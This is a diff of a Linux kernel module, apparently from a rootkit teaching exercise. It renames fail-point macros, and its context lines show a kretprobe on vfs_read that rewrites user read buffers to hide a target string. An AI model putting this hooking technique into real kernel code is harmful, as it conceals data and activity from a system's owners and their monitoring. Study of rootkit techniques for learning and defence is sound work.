@@ -15,7 +15,7 @@
 
 #define RK_TARGET_STRING "SECRET"
 #define RK_TARGET_LENGTH (sizeof(RK_TARGET_STRING) - 1)
-#define RK_MISSING_TARGET "__rootkitlings_missing_kretprobe_target_7_2__"
+#define RK_MISSING_TARGET "__rklings_missing_kretprobe_target_7_2__"
 
 struct rk_read_instance {
 	char __user *buffer;
@@ -58,7 +58,7 @@ static int rk_read_return(struct kretprobe_instance *instance,
 		return 0;
 	}
 
-	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_COPY_FROM_USER ||
+	if (RKLINGS_FAIL_POINT == RK_FAIL_COPY_FROM_USER ||
 	    copy_from_user_nofault(read->scratch, read->buffer, result) != 0) {
 		atomic_long_inc(&copy_failures);
 		regs_set_return_value(registers, -EFAULT);
@@ -71,7 +71,7 @@ static int rk_read_return(struct kretprobe_instance *instance,
 	if (new_length == (size_t)result)
 		return 0;
 
-	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_COPY_TO_USER ||
+	if (RKLINGS_FAIL_POINT == RK_FAIL_COPY_TO_USER ||
 	    copy_to_user_nofault(read->buffer, read->scratch, new_length) != 0) {
 		atomic_long_inc(&copy_failures);
 		regs_set_return_value(registers, -EFAULT);
@@ -84,7 +84,7 @@ static int rk_read_return(struct kretprobe_instance *instance,
 }
 
 static struct kretprobe read_probe = {
-#if ROOTKITLINGS_FAIL_POINT == RK_FAIL_KRETPROBE_TARGET
+#if RKLINGS_FAIL_POINT == RK_FAIL_KRETPROBE_TARGET
 	.kp.symbol_name = RK_MISSING_TARGET,
 #else
 	.kp.symbol_name = "vfs_read",
